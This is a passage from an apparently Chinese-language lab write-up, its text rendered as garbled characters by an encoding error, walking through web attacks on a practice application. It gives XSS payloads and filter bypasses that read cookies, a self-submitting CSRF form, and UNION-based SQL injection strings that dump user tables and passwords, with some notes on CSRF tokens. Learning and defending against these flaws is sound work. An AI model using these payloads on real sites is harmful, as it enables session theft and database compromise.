title="å­˜å‚¨å‹xss"></a>å­˜å‚¨å‹xss</h2><p>æŒä¹…åŒ–ï¼Œä»£ç æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­çš„ï¼Œå¦‚åœ¨ä¸ªäººä¿¡æ¯æˆ–å‘è¡¨æ–‡ç« ç­‰åœ°æ–¹ï¼Œæ’å…¥ä»£ç ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œé‚£ä¹ˆè¿™äº›ä»£ç å°†å‚¨å­˜åˆ°æœåŠ¡å™¨ä¸­ï¼Œç”¨æˆ·è®¿é—®è¯¥é¡µé¢çš„æ—¶å€™è§¦å‘ä»£ç æ‰§è¡Œã€‚</p><p>å‰ç«¯-ã€‹åç«¯-ã€‹æ•°æ®åº“-ã€‹åç«¯-ã€‹å‰ç«¯ï¼špayloadç”±å‰ç«¯æäº¤ï¼Œåˆ°åç«¯æ‰§è¡Œï¼Œå­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼›æ‰“å¼€ç½‘é¡µæ—¶åˆä»æ•°æ®åº“ä¸­å¾—åˆ°æ•°æ®å‘é€åˆ°åç«¯æ‰§è¡Œï¼Œå†åˆ°å‰ç«¯ã€‚</p><p>ç›´æ¥åœ¨ç•™è¨€æ¿ä¸­è¾“å…¥payload<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><img src="https://i.loli.net/2021/02/13/wN7RkDHscbI3UjJ.png"></p><p>æ³¨å…¥xssåæ¯æ¬¡è®¿é—®éƒ½ä¼šè§¦å‘ï¼Œå› ä¸ºxssä»£ç å‚¨å­˜åˆ°äº†æœåŠ¡å™¨ä¸­</p><p><img src="https://i.loli.net/2021/02/13/rQRy7FlCu8fiDo5.png"></p><h2 id="DOMå‹xss"><a href="#DOMå‹xss" class="headerlink" title="DOMå‹xss"></a>DOMå‹xss</h2><p>ä¸ç»è¿‡åç«¯ï¼ŒåŸºäºDOMå³Document Object Modelï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰ï¼›ä¹Ÿå±äºåå°„å‹xssï¼Œé€šè¿‡ä¼ å…¥çš„å‚æ•°æ¥æ§åˆ¶è§¦å‘</p><p>click meï¼ï¼Œæ£€æŸ¥å…ƒç´ ï¼Œæ„é€ é—­åˆ</p><p><img src="https://i.loli.net/2021/02/13/Fsj4Oqi9TPAyDKN.png"></p><p><img src="https://i.loli.net/2021/02/13/x3ZUcVmphRW4dK2.png"></p><h2 id="DOMå‹xss-x"><a href="#DOMå‹xss-x" class="headerlink" title="DOMå‹xss-x"></a>DOMå‹xss-x</h2><p>ä¸€æ ·çš„å¥—è·¯ï¼Œåªæ˜¯å‚æ•°ä½ç½®ä¸åŒ</p><p><img src="https://i.loli.net/2021/02/13/GypHt4nFmIdvjsP.png"></p><h2 id="XSSç›²æ‰“"><a href="#XSSç›²æ‰“" class="headerlink" title="XSSç›²æ‰“"></a>XSSç›²æ‰“</h2><p>å°½å¯èƒ½åœ°äºä¸€åˆ‡å¯èƒ½çš„åœ°æ–¹æäº¤XSSè¯­å¥ï¼Œåªè¦åå°ç®¡ç†å‘˜çœ‹åˆ°æŸä¸€æ¡è¯­å¥ï¼Œæ­¤è¯­å¥å°±èƒ½è¢«æ‰§è¡Œã€‚<br>å¯åœ¨ç•™è¨€æ¿ä¸Šç•™ä¸‹è·å–cookieçš„ä»£ç ï¼Œåªè¦ç®¡ç†å‘˜åœ¨åå°çœ‹åˆ°ï¼Œå°±èƒ½è·å–ç®¡ç†å‘˜çš„cookieã€‚</p><p>å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;alert(<span class="hljs-built_in">document</span>.cookie)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/l3viQofK4WeatFb.png"></p><p>ç‚¹å‡»æç¤ºå¯ä»¥çœ‹åˆ°ç®¡ç†å‘˜ç™»é™†è·¯å¾„</p><p><img src="https://i.loli.net/2021/02/13/WgEbaVwl2z3Mvcq.png"></p><p>ç™»é™†åå°±èƒ½çœ‹åˆ°æˆ‘ä»¬è¾“å…¥çš„è¯­å¥ï¼Œå› æ­¤è¯¥è¯­å¥è¢«æ‰§è¡Œï¼Œcookieè¢«è·å–</p><p><img src="https://i.loli.net/2021/02/13/UqYx7lsdwj4Wzar.png"></p><h2 id="xssè¿‡æ»¤"><a href="#xssè¿‡æ»¤" class="headerlink" title="xssè¿‡æ»¤"></a>xssè¿‡æ»¤</h2><p>bypasä¸ºäº†é˜²æ­¢xssæ”»å‡»è€Œè®¾ç½®çš„waf</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>çœ‹çœ‹è¿‡æ»¤äº†ä»€ä¹ˆ</p><p>è¾“å…¥<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>  =ã€‹ â€˜&gt;â€™</p><p><img src="https://i.loli.net/2021/02/13/HnZIpcgKvPu7OaC.png"></p><p><code>alert(document.cookie)</code> =&gt; â€˜alert(document.cookie)â€™</p><p><img src="https://i.loli.net/2021/02/13/WGHE3wDIovOh5kg.png"></p><p><code>&lt;script&gt;</code>è¢«è¿‡æ»¤ä¸º<code>&gt;</code>;ä¹Ÿå°±æ˜¯è¯´<code>&lt;script</code>è¢«è¿‡æ»¤</p><p>æ­¤å¤„åªèƒ½ç”¨ å¤§å°å†™ç»•è¿‡ æˆ–è€… éscriptæ ‡ç­¾çš„payloadï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sCRipt</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">sCRipt</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">1</span>  <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">è¿‡æ»¤éƒ¨åˆ†ï¼š<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;message&#x27;</span>] != <span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-comment">//è¿™é‡Œä¼šä½¿ç”¨æ­£åˆ™å¯¹&lt;scriptè¿›è¡Œæ›¿æ¢ä¸ºç©º,ä¹Ÿå°±æ˜¯è¿‡æ»¤æ‰</span><br>    <span class="hljs-variable">$message</span>=preg_replace(<span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;message&#x27;</span>]);<br><span class="hljs-comment">//    $message=str_ireplace(&#x27;&lt;script&gt;&#x27;,$_GET[&#x27;message&#x27;]);</span><br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$message</span> == <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>        <span class="hljs-variable">$html</span>.=<span class="hljs-string">&quot;&lt;p&gt;é‚£å°±å»äººæ°‘å¹¿åœºä¸€ä¸ªäººåä¸€ä¼šå„¿å§!&lt;/p&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$html</span>.=<span class="hljs-string">&quot;&lt;p&gt;åˆ«è¯´è¿™äº›&#x27;<span class="hljs-subst">&#123;$message&#125;</span>&#x27;çš„è¯,ä¸è¦æ€•,å°±æ˜¯å¹²!&lt;/p&gt;&quot;</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨äº†å¦‚ä¸‹çš„æ­£åˆ™è¿‡æ»¤ï¼Œç±»ä¼¼åŒå†™ã€æ³¨é‡Šå¹²æ‰°éƒ½æ— æ³•ç”Ÿæ•ˆäº†</p><p><img src="https://i.loli.net/2021/02/13/wpvoqGeBJXK3LR4.png"><br><img src="https://i.loli.net/2021/02/13/vXfZuO7iCdhteKa.png"></p><h3 id="xssè¿‡æ»¤å¸¸è§bypass"><a href="#xssè¿‡æ»¤å¸¸è§bypass" class="headerlink" title="xssè¿‡æ»¤å¸¸è§bypass:"></a>xssè¿‡æ»¤å¸¸è§bypass:</h3><p>å¤§å°å†™ç»•è¿‡ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sCRipt</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">sCRipt</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åŒå†™ç»•è¿‡ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">ipt&gt;alert(<span class="hljs-built_in">document</span>.cookie)&lt;/scr</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;<span class="hljs-name">ipt</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç¼–ç ç»•è¿‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">å°†payloadè¿›è¡Œhtmlç¼–ç <br></code></pre></td></tr></table></figure><p>ä½¿ç”¨æ²¡è¢«è¿‡æ»¤çš„payloadï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">å¦‚ï¼š&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt; <br></code></pre></td></tr></table></figure><p>è¡¥ä¸€ä¸ªæ²¡è§è¿‡çš„æ³¨é‡Šå¹²æ‰°æ³•ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;scri<span class="hljs-comment">&lt;!--test--&gt;</span>pt&gt;alert(test)&lt;/scr<span class="hljs-comment">&lt;!--test--&gt;</span>ipt&gt;<br></code></pre></td></tr></table></figure><h2 id="xssä¹‹htmlspecialchars"><a href="#xssä¹‹htmlspecialchars" class="headerlink" title="xssä¹‹htmlspecialchars"></a>xssä¹‹htmlspecialchars</h2><p>htmlspecialchars():æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">htmlspecialchars(<span class="hljs-type">string</span>,flags,character-<span class="hljs-keyword">set</span>,double_encode)<br>é¢„å®šä¹‰çš„å­—ç¬¦æ˜¯ï¼š<br>&amp; ï¼ˆå’Œå·ï¼‰æˆä¸º &amp;<br><span class="hljs-string">&quot; ï¼ˆåŒå¼•å·ï¼‰æˆä¸º &quot;</span><br><span class="hljs-comment">&#x27; ï¼ˆå•å¼•å·ï¼‰æˆä¸º &#x27;</span><br>&lt; ï¼ˆå°äºï¼‰æˆä¸º &lt;<br>&gt; ï¼ˆå¤§äºï¼‰æˆä¸º &gt;<br><span class="hljs-symbol">strings:</span>è§„å®šè¦è½¬æ¢çš„å­—ç¬¦ä¸²(å¿…é€‰ï¼Œå…¶ä½™çš†ä¸ºå¯é€‰)<br><br><span class="hljs-symbol">flags:</span><br>å¯ç”¨çš„å¼•å·ç±»å‹:<br>ENT_COMPAT - ä»…ç¼–ç åŒå¼•å·(é»˜è®¤)ã€‚<br>ENT_QUOTES - ç¼–ç åŒå¼•å·å’Œå•å¼•å·ã€‚<br>ENT_NOQUOTES - ä¸ç¼–ç ä»»ä½•å¼•å·ã€‚<br><br>æ— æ•ˆçš„ç¼–ç :<br>ENT_IGNORE - å¿½ç•¥æ— æ•ˆçš„ç¼–ç ï¼Œè€Œä¸æ˜¯è®©å‡½æ•°è¿”å›ä¸€ä¸ªç©ºçš„å­—ç¬¦ä¸²ã€‚åº”å°½é‡é¿å…ï¼Œå› ä¸ºè¿™å¯èƒ½å¯¹å®‰å…¨æ€§æœ‰å½±å“ã€‚<br>ENT_SUBSTITUTE - æŠŠæ— æ•ˆçš„ç¼–ç æ›¿ä»£æˆä¸€ä¸ªæŒ‡å®šçš„å¸¦æœ‰ <span class="hljs-keyword">Unicode</span> æ›¿ä»£å­—ç¬¦ U+FFFDï¼ˆUTF-<span class="hljs-number">8</span>ï¼‰æˆ–è€… &amp;#FFFD; çš„å­—ç¬¦ï¼Œè€Œä¸æ˜¯è¿”å›ä¸€ä¸ªç©ºçš„å­—ç¬¦ä¸²ã€‚<br>ENT_DISALLOWED - æŠŠæŒ‡å®šæ–‡æ¡£ç±»å‹ä¸­çš„æ— æ•ˆä»£ç ç‚¹æ›¿ä»£æˆ <span class="hljs-keyword">Unicode</span> æ›¿ä»£å­—ç¬¦ U+FFFDï¼ˆUTF-<span class="hljs-number">8</span>ï¼‰æˆ–è€… &amp;#FFFD;ã€‚<br><br>character-<span class="hljs-keyword">set</span>ï¼šè§„å®šäº†è¦ä½¿ç”¨çš„å­—ç¬¦é›†çš„å­—ç¬¦ä¸²ï¼›é»˜è®¤ä¸ºutf-<span class="hljs-number">8</span><br><br>double_encodeï¼šè§„å®šäº†æ˜¯å¦ç¼–ç å·²å­˜åœ¨çš„ HTML å®ä½“ï¼›ä¸ºboolå‹(<span class="hljs-literal">TRUE</span>/<span class="hljs-literal">FALSE</span>)<br><br><span class="hljs-symbol">ps:</span>$test = htmlspecialchars($name, ENT_QUOTES);<br></code></pre></td></tr></table></figure><p>æ­¤å¤„xssæ¼æ´å¯èƒ½å­˜åœ¨çš„åŸå› æ˜¯ï¼šhtmlspecialchars()å‡½æ•°é»˜è®¤å¯¹åŒå¼•å·ç¼–ç ï¼Œå¼€å‘è€…ä¸å¯¹å•å¼•å·è¿›è¡Œè¿‡æ»¤( flags != ENT_QUOTES )çš„è¯å°±å¯èƒ½å¯¼è‡´xsså‘é€</p><p>payload:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-string">&#x27; onclick=&#x27;</span>alert<span class="hljs-comment">(1)</span><span class="hljs-string">&#x27;  #ç¬¬ä¸€ä¸ªå•å¼•å·æ„é€ é—­åˆï¼›å…¶åä¸¤ä¸ªå•å¼•å·ç¡®ä¿å‚æ•°ä¸è¢«è¿‡æ»¤</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/lOBqcQizpEeoL32.png"></p><p><img src="https://i.loli.net/2021/02/13/px138UhcSXsrZFn.png"></p><p>è¿™é‡Œä¹Ÿå¯ä»¥ç”¨</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&#x27; onclick=&#x27;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure><p>è¾“å…¥â€™ onclick=â€™alert(1)ï¼Œæ£€æŸ¥å¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/02/13/B3ol2DxtfuWyCOJ.png"></p><p>åˆ™å¯ç›´æ¥â€™ onclick=â€™alert(1)å³å¯æ„é€ é—­åˆ</p><p><img src="https://i.loli.net/2021/02/13/GHZ3l2Mh6cdVeY5.png"></p><h2 id="xssä¹‹hrefè¾“å‡º"><a href="#xssä¹‹hrefè¾“å‡º" class="headerlink" title="xssä¹‹hrefè¾“å‡º"></a>xssä¹‹hrefè¾“å‡º</h2><p>å½“è¾“å‡ºåœ¨aæ ‡ç­¾é‡Œçš„hrefå±æ€§æ—¶ï¼Œå¯ä»¥ç”¨jsåè®®æ¥æ‰§è¡Œjsä»£ç </p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-variable">document.cookie</span>)</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/agRLiSwItMkbPpc.png"></p><h2 id="xssä¹‹jsè¾“å‡º"><a href="#xssä¹‹jsè¾“å‡º" class="headerlink" title="xssä¹‹jsè¾“å‡º"></a>xssä¹‹jsè¾“å‡º</h2><p>å…ˆå°è¯•<code>javascript:alert(document.cookie)</code></p><p><img src="https://i.loli.net/2021/02/13/6MujQIK5EToaROw.png"></p><p>å‘ç°æˆ‘ä»¬çš„è¾“å…¥è¢«æ’å…¥åˆ°äº†<code>&lt;script&gt;</code>å’Œ<code>&lt;/script&gt;</code>ä¹‹é—´<img src="https://i.loli.net/2021/02/13/1uqfpyblSezWXaM.png"></p><p>å¯ä»¥æ ¹æ®æ­¤æ„é€ é—­åˆï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">javascript:alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/SWBmEryhnje5VMt.png"></p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>åˆ©ç”¨ç›®æ ‡ç”¨æˆ·çš„åˆæ³•èº«ä»½ï¼Œä»¥ç›®æ ‡ç”¨æˆ·çš„åä¹‰æ‰§è¡ŒæŸäº›éæ³•æ“ä½œ</p><p>CSRFä¸xsså·®åˆ«å°±åœ¨äºï¼šxssåˆ©ç”¨ç«™å†…ç”¨æˆ·ä¿¡ä»»ç‚¹ï¼ŒCSRFåˆ©ç”¨</p><h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>ä¿®æ”¹çš„å‚æ•°ä»¥getå½¢å¼ä¼ è¾“ï¼Œç”±æ­¤å¯ä»¥ä¼ªé€ é“¾æ¥ç»™å—å®³è€…ç‚¹å‡»</p><p><img src="https://i.loli.net/2021/02/13/VWMkeIBN2mc8Evn.png"></p><h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>ä¿®æ”¹çš„ä¿¡æ¯ä»¥postå½¢å¼ä¼ è¾“</p><p><img src="https://i.loli.net/2021/02/13/ladkx4vpMRymZKV.png"></p><p>è¿™ç§ç±»å‹çš„CSRFå±å®³æ²¡æœ‰GETå‹çš„å¤§ï¼Œåˆ©ç”¨èµ·æ¥é€šå¸¸ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªè‡ªåŠ¨æäº¤çš„è¡¨å•ï¼Œå¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">http://wooyun.org/csrf.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">POST</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xx&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;11&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"> <span class="hljs-built_in">document</span>.forms[<span class="hljs-number">0</span>].submit(); </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>è®¿é—®è¯¥é¡µé¢åï¼Œè¡¨å•ä¼šè‡ªåŠ¨æäº¤ï¼Œç›¸å½“äºæ¨¡æ‹Ÿç”¨æˆ·å®Œæˆäº†ä¸€æ¬¡POSTæ“ä½œ</p><h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h2><p>åˆ©ç”¨Tokené˜²æ­¢CSRFæœºåˆ¶ï¼š</p><p>CSRFçš„ä¸»è¦é—®é¢˜æ˜¯æ•æ„Ÿæ“ä½œçš„é“¾æ¥å®¹æ˜“è¢«ä¼ªé€ ï¼Œæ·»åŠ Tokenï¼Œæ¯æ¬¡è¯·æ±‚,éƒ½å¢åŠ ä¸€ä¸ªéšæœºç (åˆ©ç”¨ç®—æ³•ï¼Œç”Ÿæˆä¸å¯çŒœæµ‹çš„tokenéšæœºç ) , åå°åœ¨æ¯æ¬¡ç™»å½•æ—¶éƒ½å¯¹éšæœºç tokenè¿›è¡ŒéªŒè¯ï¼Œä¸æœåŠ¡ç«¯ç”Ÿæˆçš„sessionè¿›è¡Œæ¯”è¾ƒã€‚</p><p><strong>Token</strong>ï¼š</p><p>ç›®å‰ä¸»æµçš„åšæ³•æ˜¯ä½¿ç”¨TokenæŠµå¾¡CSRFæ”»å‡»ã€‚ä¸‹é¢é€šè¿‡åˆ†æCSRF æ”»å‡»æ¥ç†è§£ä¸ºä»€ä¹ˆTokenèƒ½å¤Ÿæœ‰æ•ˆ</p><p>CSRFæ”»å‡»è¦æˆåŠŸçš„æ¡ä»¶åœ¨äºæ”»å‡»è€…èƒ½å¤Ÿé¢„æµ‹æ‰€æœ‰çš„å‚æ•°ä»è€Œæ„é€ å‡ºåˆæ³•çš„è¯·æ±‚ã€‚æ‰€ä»¥æ ¹æ®ä¸å¯é¢„æµ‹æ€§åŸåˆ™ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å‚æ•°è¿›è¡ŒåŠ å¯†ä»è€Œé˜²æ­¢CSRFæ”»å‡»ã€‚</p><p>å¦ä¸€ä¸ªæ›´é€šç”¨çš„åšæ³•æ˜¯ä¿æŒåŸæœ‰å‚æ•°ä¸å˜ï¼Œå¦å¤–æ·»åŠ ä¸€ä¸ªå‚æ•°Tokenï¼Œå…¶å€¼æ˜¯éšæœºçš„ã€‚è¿™æ ·æ”»å‡»è€…å› ä¸ºä¸çŸ¥é“Tokenè€Œæ— æ³•æ„é€ å‡ºåˆæ³•çš„è¯·æ±‚è¿›è¡Œæ”»å‡»ã€‚</p><p><strong>Token ä½¿ç”¨åŸåˆ™</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">Token</span>è¦è¶³å¤Ÿéšæœºâ€”â€”â€”â€”åªæœ‰è¿™æ ·æ‰ç®—ä¸å¯é¢„æµ‹<br><span class="hljs-keyword">Token</span>æ˜¯ä¸€æ¬¡æ€§çš„ï¼Œå³æ¯æ¬¡è¯·æ±‚æˆåŠŸåè¦æ›´æ–°<span class="hljs-keyword">Token</span>â€”â€”â€”â€”è¿™æ ·å¯ä»¥å¢åŠ æ”»å‡»éš¾åº¦ï¼Œå¢åŠ é¢„æµ‹éš¾åº¦<br><span class="hljs-keyword">Token</span>è¦æ³¨æ„ä¿å¯†æ€§â€”â€”â€”â€”æ•æ„Ÿæ“ä½œä½¿ç”¨<span class="hljs-keyword">post</span>ï¼Œé˜²æ­¢<span class="hljs-keyword">Token</span>å‡ºç°åœ¨URLä¸­<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/iagwKEedYIApjRT.png"></p><h1 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql-inject"></a>sql-inject</h1><p>å¯ä»¥æ‰“ä¸€ä¸‹sqli-libs~~~</p><h2 id="æ•°å­—å‹æ³¨å…¥"><a href="#æ•°å­—å‹æ³¨å…¥" class="headerlink" title="æ•°å­—å‹æ³¨å…¥"></a>æ•°å­—å‹æ³¨å…¥</h2><p>postã€æ•°å­—å‹ï¼š1 and 1=1 #æ­£å¸¸å›æ˜¾ï¼›1 and 1=2 #éæ­£å¸¸</p><p>å¦‚å›¾</p><p><img src="https://i.loli.net/2021/02/13/pC2H5kLJMeocsWv.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">-1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#åˆ¤æ–­å­—æ®µæ•°<br>id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">--+#çˆ†è¡¨å</span><br>id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+#çˆ†åˆ—å</span><br>id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username,<span class="hljs-number">0x2b</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+#çˆ†æ•°æ®</span><br><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/tPZqCKzXlvcyROn.png"></p><h2 id="å­—ç¬¦å‹æ³¨å…¥"><a href="#å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥"></a>å­—ç¬¦å‹æ³¨å…¥</h2><p>getã€å­—ç¬¦å‹ï¼šid=1â€™ #ä¿é”™ï¼Œid=1â€™ â€“+ # æ­£å¸¸</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">name</span>=1&#x27; order by 2--+<br>?<span class="hljs-attribute">name</span>=1&#x27; union select 1,2--+<br>?<span class="hljs-attribute">name</span>=-1&#x27; union select 1,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()--+#çˆ†è¡¨å<br>?<span class="hljs-attribute">name</span>=-1&#x27; union select 1,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+#çˆ†åˆ—å<br>?<span class="hljs-attribute">name</span>=-1&#x27; union select 1,group_concat(username,0x2b,password) <span class="hljs-keyword">from</span> users--+#çˆ†æ•°æ®<br><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/8m4BP6V2GSRJoig.png"></p><h2 id="æœç´¢å‹æ³¨å…¥"><a href="#æœç´¢å‹æ³¨å…¥" class="headerlink" title="æœç´¢å‹æ³¨å…¥"></a>æœç´¢å‹æ³¨å…¥</h2><p>åç«¯çš„sqlæŸ¥è¯¢è¯­å¥ä½¿ç”¨äº†æ¨¡ç³Šå·®å¼‚å¦‚ <code>select id form æŸè¡¨ like &#39; %xxx% &#39;</code></p><p>payloadçš„æ„é€ 